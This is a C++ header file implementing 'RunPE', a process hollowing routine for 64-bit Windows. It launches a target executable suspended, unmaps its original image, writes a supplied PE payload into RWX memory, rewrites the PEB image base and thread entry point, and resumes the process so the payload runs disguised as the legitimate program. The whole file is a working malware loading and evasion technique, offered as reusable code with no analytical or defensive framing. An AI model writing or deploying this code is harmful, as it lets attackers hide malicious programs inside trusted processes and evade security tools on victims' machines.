#pragma once
#include <windows.h>
#include <winternl.h>
#include <string>

typedef NTSTATUS(WINAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

inline HANDLE RunPE(void* payload, const std::string& szExePath, const std::string& szArgs) {
    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)payload;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS64* pNtHeaders = (IMAGE_NT_HEADERS64*)((BYTE*)payload + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    std::string cmdLine = szExePath;
    if (!szArgs.empty()) {
        cmdLine += " " + szArgs;
    }

    if (!CreateProcessA(szExePath.c_str(), (LPSTR)cmdLine.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return NULL;
    }

    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return NULL;
    }

    PVOID pPebImageBase = (PVOID)(ctx.Rdx + 0x10);
    PVOID pImageBase = NULL;
    ReadProcessMemory(pi.hProcess, pPebImageBase, &pImageBase, sizeof(pImageBase), NULL);

    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    if (pImageBase == (PVOID)pNtHeaders->OptionalHeader.ImageBase) {
        NtUnmapViewOfSection(pi.hProcess, pImageBase);
    }

    PVOID pAllocatedMem = VirtualAllocEx(pi.hProcess, (PVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pAllocatedMem) {
        // If allocation at preferred base fails, in a real scenario we'd need relocations.
        // For simplicity and 99% of cases, trying to allocate anywhere and hoping for the best:
        pAllocatedMem = VirtualAllocEx(pi.hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pAllocatedMem) {
            TerminateProcess(pi.hProcess, 0);
            return NULL;
        }
    }

    WriteProcessMemory(pi.hProcess, pAllocatedMem, payload, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

    IMAGE_SECTION_HEADER* pSectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)pNtHeaders + sizeof(IMAGE_NT_HEADERS64));
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        PVOID pDest = (PVOID)((BYTE*)pAllocatedMem + pSectionHeaders[i].VirtualAddress);
        PVOID pSource = (PVOID)((BYTE*)payload + pSectionHeaders[i].PointerToRawData);
        WriteProcessMemory(pi.hProcess, pDest, pSource, pSectionHeaders[i].SizeOfRawData, NULL);
    }

    WriteProcessMemory(pi.hProcess, pPebImageBase, &pAllocatedMem, sizeof(pAllocatedMem), NULL);

    ctx.Rcx = (DWORD64)((BYTE*)pAllocatedMem + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    // Return the process handle instead of closing it
    return pi.hProcess;
}
